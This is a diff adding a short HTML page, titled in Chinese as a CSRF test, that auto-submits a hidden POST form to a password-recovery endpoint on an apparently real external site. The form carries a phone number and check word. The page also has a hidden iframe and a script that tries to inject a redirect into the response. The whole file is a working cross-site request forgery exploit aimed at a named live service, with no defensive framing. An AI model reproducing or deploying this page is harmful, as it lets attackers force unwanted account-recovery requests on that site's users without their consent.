@@ -1,0 +1,43 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  <title>CSRF 测试</title>
+  <script>
+    // 监听页面加载完毕后自动提交表单
+    window.onload = function() {
+      document.forms[0].submit();
+    };
+  </script>
+</head>
+<body>
+
+  <form id="csrfForm" method="POST" action="https://nb113.net/index.php?s=/ForgetPage/formRemeber" target="resultFrame">
+    <input type="hidden" name="phone" value="0976261367">
+    <input type="hidden" name="checkword" value="12345">
+    <input type="hidden" name="btnok" value="">
+  </form>
+
+  <!-- 用来承载 POST 提交结果的隐藏 iframe -->
+  <iframe name="resultFrame" style="display:none;" onload="injectRedirect(this)"></iframe>
+
+  <script>
+    function injectRedirect(iframe) {
+      try {
+        const doc = iframe.contentDocument || iframe.contentWindow.document;
+        const head = doc.querySelector('head');
+        if (head) {
+          const meta = doc.createElement('meta');
+          meta.setAttribute('http-equiv', 'refresh');
+          meta.setAttribute('content', '5;url=https://nb113.net/404.html');
+          head.appendChild(meta);
+        }
+      } catch (e) {
+        console.error('注入跳转失败:', e);
+      }
+    }
+  </script>
+
+</body>
+</html>
